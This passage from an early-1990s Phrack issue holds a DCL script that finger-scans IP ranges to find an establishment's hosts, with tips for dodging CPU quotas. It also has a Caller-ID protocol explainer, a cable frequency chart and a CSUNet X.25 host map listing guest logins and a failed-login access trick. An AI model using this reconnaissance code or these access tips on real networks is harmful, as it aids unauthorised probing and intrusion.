+Most people won't be impressed.  If your a SYSOP, fix this DAMN HOLE!!! And if
+your a user well, learn the system quickly, explore, absorb, and discover some
+other hole before the above SYSOP patches this one......
+
+  COMMENTS, QUESTIONS, ADDITIONS, ETC can be sent to PHRACK LOOPBACK. ENJOY!!
+{______________________________________________________________________________}
+
+*****************************************************************************
+
+                               A Internet Scanner
+
+                                  (War Dialer)
+
+                                       by
+
+                                    MadHatter
+
+
+
+Purpose of this program
+~~~~~~~~~~~~~~~~~~~~~~~
+
+     Remember those scanner, war dialer programs everyone used to scan areas of
+telephone numbers to find unknown hosts?  Well, now your on the net and you're
+targeting some certain establishment, and you know which part of the net they
+own, but the hell if you know what the actual IP addresses of their hosts are...
+Telneting to NIC.DDN.MIL is no help, their records are a year old...  Might as
+well have been 10 yrs ago...  So you type every possible IP address in.  Right?
+After a while that shit gets tiring...  Well, hell let the computer do it,
+that's what its there for.  More speed, no sore fingers, no bitching, and it
+runs when you're not there.  Almost perfect.....
+
+
+Program Details
+~~~~~~~~~~~~~~~
+     DCL is the language and it runs on Vaxen.  A,B,C,D respectively represent
+the starting IP address.  E,F,G,H respectively represent the ending IP address
+(ex. If you what to start at 4.1.1.1 and end at 6.1.1.1 then a = 4, B = 1,
+etc.,  E = 6, F = 1, etc.)
+     The prog creates a data file (FINAL.DAT) that holds all successful
+connections.  If you run it in batch, it also creates a .log file.  This by
+far takes up most of the memory.  When the program quits, delete it.
+This prog is just one big loop.  It finds a good telnet address and then
+reIFINGERs there, saving it.
+
+
+Program Changes
+~~~~~~~~~~~~~~~
+
+     If you run it in batch, then you might (probably) have to define where
+the IFINGER or FINGER program is.  Make sure it is the one for FINGERing remote
+hosts, the commands for it vary.  Why do you have to define it?  Because the
+dumb-ass sysop couldn't think of why anyone would want to use it in batch.
+
+
+Problems
+~~~~~~~~
+
+     The IFINGER (FINGER) command might not connect to some hosts from your
+system.  Why can you TELNET there but no IFINGER?  It all probably has to do
+with the other host (it has tight security, too far away, doesn't support
+FINGERing, etc.).
+
+
+No Solutions (Just one)
+~~~~~~~~~~~~~~~~~~~~~~~
+
+     You say if I can TELNET to more places than IFINGERing, why not base the
+scanner on the TELNET command?  Two reasons: (1) the security with the TELNET
+command requires its output goes to a terminal, never to run in batch; (2) the
+TELNET command does not give the character address (at least not on the system I
+use).  To have the character address is valuable to me.  The program lists the
+IP address, the character address, then whatever finger came up with.
+     When running in batch, the program will quit eventually (do to MAX CPU
+time or exceeded disk quota).  This can be a pain (especially if its CPU time),
+you can always get more memory.  Try changing the file specifics in the prog,
+and run many versions of it at once, to get as much cpu time as possible.
+For memory, clear your account, or get more of them.  Another problem is when
+your program has stopped and you have nothing in FINAL.DAT file.  So where do
+you start the batch off again?  All I can say is count the number of failed
+connections and add 'em to your previous start address, start at that address.
+
+
+More Ideas
+~~~~~~~~~~
+
+     If you want the net area of an establishment then ftp to NIC.DDN.MIL and
+get the hosts listing, or TELNET there and search for the name.
+     Some areas of the net do not like to be scanned.  Your sysop will get nasty
+calls, and then you will get nasty e-mail if you for instance scan the Army
+Information Systems Center.  Or any other government org.  Of course, this
+program wouldn't hurt them at all, it would bounce back.  They use firewalls.
+But they will bitch anyway.
+     After you run this program for awhile, you'll notice the net is really
+a big empty place.  Hosts are few and far between (at least address wise).
+Are you agoraphobic yet?  What do you do with all this room?
+
+
+MadHatter
+
+
+*----------------------------CUT HERE------------------------------------------*
+$ A = 0
+$ B = 0
+$ C = 0
+$ D = 0
+$ E = 257
+$ F = 0
+$ G = 0
+$ H = 0
+$ D = D - 1
+$ IFINGER := $VMS$UTIL:[IFINGER]FINGER.EXE;1
+$ CREATE FINAL.DAT
+$ LOOP1:
+$     ON SEVERE_ERROR THEN GOTO SKIP
+$     D = D + 1
+$     IFINGER @'A'.'B'.'C'.'D'
+$     ON SEVERE_ERROR THEN GOTO SKIP
+$     ASSIGN TEMPFILE.DAT SYS$OUTPUT
+$     WRITE SYS$OUTPUT &quot;[&quot;'A'&quot;.&quot;'B'&quot;.&quot;'C'&quot;.&quot;'D'&quot;]&quot;
+$     IFINGER @'A'.'B'.'C'.'D'
+$     DEASSIGN SYS$OUTPUT
+$     APPEND TEMPFILE.DAT FINAL.DAT
+$     DELETE TEMPFILE.DAT;*
+$ SKIP:
+$     IF A .EQ. E THEN IF B .EQ. F THEN IF C .EQ. G THEN IF D .EQ. H THEN EXIT
+$     IF D .EQ. 256 THEN GOTO LOOP2
+$     IF C .EQ. 256 THEN GOTO LOOP3
+$     IF B .EQ. 256 THEN GOTO LOOP4
+$     GOTO LOOP1
+$ LOOP2:
+$      D = 0
+$      C = C + 1
+$      GOTO LOOP1
+$ LOOP3:
+$      C = 0
+$      B = B + 1
+$      GOTO LOOP1
+$ LOOP4:
+$      B = 0
+$      A = A + 1
+$      GOTO LOOP1
+$ EXIT
+*------------------------------------CUT HERE----------------------------------*
+
+*****************************************************************************
+
+       Caller Identification
+       by (Loq)ue &amp; Key
+       3/20/93
+
+
+        Caller-Identification (CID), is a relatively new service being
+   offered by several carriers.  It is part of a total revamp of the
+   telephone network, with the telephone companies trying to get people
+   to spend more money on their systems.  CID is just one of the newer
+   CLASS services, which will eventually lead into ISDN in all areas.
+
+        Caller-ID allows a receiving party to see the number that is
+   calling before they pick up the phone.  It can be used for everything
+   from pizza delivery to stopping prank callers.  One scenario
+   made possible from CID is one where a salesman dials your number,
+   you look on a little box and see that it is someone you don't want
+   to talk to, so you promptly pick up the phone, say &quot;Sorry, I don't
+   want any *** *** products&quot; and slam down the receiver.  Ah, the
+   wonders of modern technology.
+
+        Caller-ID starts by a person making a call.  When the person
+   dials a number, the local switch rings the calling number once, and
+   then sends a specially encoded packet to the number, after checking
+   to see if that caller has access to the Calling Number Delivery
+   service.
+
+        The packet can contain any information, but currently it holds
+   a data stream that contains flow control, and error checking data.
+   The specifications state that several signals can exist, however,
+   only the Caller-ID signal is used currently.
+
+ The CID packet begins with a &quot;Channel Seizure Signal&quot;.  The
+   CSC is 30 bytes of hex 55, binary 01010101, which is equivalent to
+   250 milliseconds of a 600 hz square wave.
+
+        The second signal is the &quot;Carrier Signal,&quot; which lasts for 150
+   milliseconds, and contains all binary 1's. The receiving equipment
+   should have been &quot;woken-up&quot; by the previous signal and should now
+   be waiting for the important information to come across.
+
+        Next are the &quot;Message Type Word&quot;, and the &quot;Message Length Word&quot;.
+   The MTW contains a Hex $04 for CID applications, with several other
+   codes being planned, for example $0A to mean message waiting for
+   a pager.  The MLW contains the binary equivalent of the number of
+   digits in the calling number.
+
+        The data words come next, in ASCII, with the least significant
+   digit first.  It is padded in from with a binary 0, and followed by
+   a binary 1.  A checksum word comes after that, which contains the
+   twos-complement sum of the MLW and data words.
+
+ The checksum word usually signals the end of the message from
+    the CO, however, other messages for equipment to decode can occur
+    afterwards.
+
+        Caller-ID can usually be disabled with a 3 digit sequence,
+   which can vary from CO to CO.  Several of these have been mentioned
+   in the past on Usenet, in comp.dcom.telecom.
+
+        Caller-ID chips are available from many sources, however,
+   remember that you must connect these chips through an FCC-approved
+   Part-68 Interface.  Several of these interfaces are available,
+   however they are fairly expensive for an amateur electronics hacker.
+
+        If you have any more questions on CID, mail me at the above
+   address, or post to comp.dcom.telecom.
+
+       Additional Sources from Bellcore:
+
+        Nynex Catalog of Technical Information #NIP-7400
+        SPCS Customer Premises Equipment Data Interface #TR-TSY-0030
+        CLASS Feature: Calling Number Delivery #FSD-02-1051
+        CLASS Feature: Calling Number Blocking #TR-TSY-000391
+
+*****************************************************************************
+
+     THE  &quot;OFFICIAL&quot;  CABLE  TELEVISION  VIDEO  FREQUENCY  SPECTRUM  CHART
+               COURTESY  OF:   JOE  (WA1VIA)   &amp;   JIM  (WA1FTA)
+
+CATV CHANNEL        FREQUENCY (MHz)          CATV CHANNEL      FREQUENCY (MHz)
+-------------------------------------------------------------------------------
+ 2      2            55.25                    37     AA         301.25
+ 3      3            61.25                    38     BB         307.25
+ 4      4            67.25                    39     CC         313.25
+ 5      5            77.25                    40     DD         319.25
+ 6      6            83.25  (85.25 ICC)       41     EE         325.25
+---------------------------------------       42     FF         331.25
+ 7      7           175.25                    43     GG         337.25
+ 8      8           181.25                    44     HH         343.25
+ 9      9           187.25                    45     II         349.25
+10     10           193.25                    46     JJ         355.25
+11     11           199.25                    47     KK         361.25
+12     12           205.25                    48     LL         367.25
+13     13           211.25                    49     MM         373.25
+---------------------------------------       50     NN         379.25
+14      A           121.25                    51     OO         385.25
+15      B           127.25                    52     PP         391.25
+16      C           133.25                    53     QQ         397.25
+17      D           139.25                    54     RR         403.25
+18      E           145.25                    55     SS         409.25
+19      F           151.25                    56     TT         415.25
+20      G           157.25                    57     UU         421.25
+21      H           163.25                    58     VV         427.25
+22      I           169.25                    59     WW         433.25
+----------------------------------------      60     W+         439.25
+23      J           217.25                    ---------------------------------
+24      K           223.25                    61     W+1        445.25
+25      L           229.25                    62     W+2        451.25
+26      M           235.25                    63     W+3        457.25
+27      N           241.25                    64     W+4        463.25
+28      O           247.25                    65     W+5        469.25
+29      P           253.25                    ---------------------------------
+30      Q           259.25                    66     A-1        115.25
+31      R           265.25                    67     A-2        109.25
+32      S           271.25                    68     A-3        103.25
+33      T           277.25                    69     A-4         97.25
+34      U           283.25                    70     A-5         91.25
+35      V           289.25                    ---------------------------------
+36      W           295.25                    01     A-8         73.25
+-------------------------------------------------------------------------------
+* This chart was created 08/19/89 by:  WA1VIA &amp; WA1FTA.   Some uses include the
+isolation of CATV interference to other radio services,  and building of active
+&amp; passive filters,  and descramblers.  This does NOT give you the right to view
+or decode premium cable channels;  without proper authorization from your local
+cable TV company.  Federal and various state laws provide for substantial civil
+an criminal penalties for unauthorized use.
+-------------------------------------------------------------------------------
+******************************************************************************
+
+                          -----------------------------
+                             The CSUNet X.25 Network
+                              Overview by Belgorath
+                          -----------------------------
+                              C y b e r   C o r p s
+
+     Calstate University, along with Humboldt State, runs a small X.25 network
+interconnecting its campuses. This file will attempt to give an overview of
+this network. The hosts on this network are connected via 9600-baud links. The
+main PAD on this network is a PCI/01 that allows the user to connect to several
+hosts. Among them are:
+
+(At the time of this writing, several of the machines were unreachable. They
+ are marked with &quot;No info available&quot;)
+
+hum       - Humboldt State University CDC Cyber 180-830 (NOS 2.7.1)
+swrl      - A CalState CDC Cyber named &quot;Swirl&quot;, running CDCNet. You may use
+            CDCNet to connect to the following hosts:
+            ATL    (SunOS, eis.calstate.edu), login as:
+               access to request an account
+               ctp    to access CTP
+            CCS    CDC Cyber 960-31 (NOS 2.7.1) - This is Swirl without CDCNet
+            COC    CDC Cyber 960-31 (NOS 2.7.1)
+            FILLY  VAX 6230 (VMS 5.3)
+            ICEP   IBM 4381 (VM)
+            OX     IBM 4381 (MVS) (Aptly Named)
+mlvl      - University of California's Library Catalog System, named
+            &quot;Melvyl&quot;.
+sb        - Calstate/San Bernardino CDC Cyber 180-830 (NOS 2.5.2)
+sd        - San Diego State University CDC Cyber 180-830B (NOS 2.7.1)
+chi       - Calstate/Chico CDC Cyber 180-830 (NOS 2.7.1) - oddly enough
+            this system is running CDCNet with itself as the only host
+bak       - Calstate/Bakersfield CDC Cyber Dual 830 CMR-1 (NOS 2.7.1)
+            this system is running CDCNet, and if you fail the login, you
+            can connect to these systems, if you type fast enough:
+            CCS      - Central Cyber 960 System
+            CSBINA   - CSUB Instructional Vax 3900
+            CSBOAA   - CSUB Office Automation Vax 4300
+            CYBER    - Local host
+            RBFBATCH - CSUB CDC Cyber Remote Batch Gateway
+ccs       - CDC Cyber 960-31 (CCS from Swirl)
+coc       - CDC Cyber 960-31 (COC from Swirl)
+dh        - Calstate/Dominguez Hills CDC Cyber 960-11 (NOS 2.7.1) -
+            this system runs CDCNet with no hosts.. go figure
+fre       - Calstate/Fresno - No info available
+ful       - Calstate/Fullerton - No info available
+hay       - Calstate/Hayward - No info available
+la        - Calstate/Los Angeles - No info available
+lb        - Calstate/Long Beach - No info available
+mv        - No info available
+news      - No info available
+nor       - Calstate/Northridge - No info available
+pom       - California State Polytechnic University, Pomona - No info available
+sac       - Calstate/Sacramento CDC Cyber 180-830 (NOS 2.5.2)
+sf        - Calstate/San Francisco - No info available
+sj        - San Jose State University - No info available
+son       - Sonoma State University CDC Cyber 180-830 (NOS 2.7.1) - this
+            system runs CDCNet with itself as the only host
+sm        - No info available
+slo       - California State Polytechnic University, San Luis Obispo - No info
+            available
+sta       - Calstate/Stanislaus - No info available
+ven       - No info available
+carl      - No info available
+
+caps      - CSUNet networking machine. From it, you can connecting to most
+            PAD hosts plus a few more. The extras are:
+            access    - Connect to eis.calstate.edu (login as &quot;access&quot;)
+            core      - Connect to eis.calstate.edu (login as &quot;core&quot;)
+            ctp       - Connect to eis.calstate.edu (login as &quot;ctp&quot;)
+            eis       - Connect to eis.calstate.edu (login as &quot;eis&quot;)
+            trie      - Connect to eis.calstate.edu (login as &quot;trie&quot;)
+            csupernet - CSUPERNet appears to be a public-access UNIX.
+                        login as &quot;public&quot; for ATI-Net.
+                        login as &quot;super&quot; for academic information.
+                        login as &quot;atls&quot; for the ATLS system
+                        Once you apply for an account here, you can telnet
+                        to caticsuf.cati.csufresno.edu to use it.
+
+     This is all well and good, but how to you access CSUNet? It can be reached
+via Internet, using the Humbolt PACX (pacx.humboldt.edu). The Humboldt PACX
+allows several services, among them are:
+
+     X25 - Connect directly to CSUNet PAD
+     960 - CDC Cyber 180/830 (Swirl)
+     830 - CDC Cyber 180/830 (COC from Swirl)
+     VAX - VAX 8700 (VMS V5.3)
+     70  - DEC PDP 11/70 (running RSTS)
+     SEQ - Sequent S81 (running Dynix V3.1.4 X.25 UNIX software)
+  TELNET - Telnet Server
+
+     That's really all there is to say concerning the network structure (well,
+I could go through and list all their X.25 addresses, but I won't). There's a
+ton more to be said about using this network, but its little quirks and
+surprises can be left to you to figure out. What I can do here is give a few
+hints on using CDCNet and the PAD.
+
+Using the PAD
+~~~~~~~~~~~~~
+     Once you're at the X.25 PAD, you'll get a message like:
+CSUnet Humboldt PCI/01, Port: P17
+     At the &quot;Pad&gt;&quot; prompt, simply type the hostname to connect to. When in
+doubt, type &quot;help &lt;subjectname&gt;&quot;, or just &quot;help&quot; for a list of subjects that
+help is available on.
+
+Using CDCNet
+~~~~~~~~~~~~
+     When a CDC Cyber says &quot;You may now execute CDCNet Commands&quot;, this is your
+cue. You have the following commands available:
+
+activate_auto_recognition
+activate_x_personal_computer
+change_connection_attribute
+change_terminal_attribute
+change_working_connection
+create_connection
+delete_connection
+display_command_information
+display_command_list
+display_connection
+display_connection_attribute
+display_service
+display_terminal_attribute
+do
+help
+request_network_operator
+
+     The ones to concern yourself with are display_service, create_connection,
+and help. &quot;help&quot; gives the above command listing (useful), &quot;display_service&quot;
+lists the hosts on the current CDCNet, and &quot;create_connection &lt;host&gt;&quot; creates a
+connection to &quot;host&quot; on the CDCNet.
+
+*******************************************************************************
+
+
+ </pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
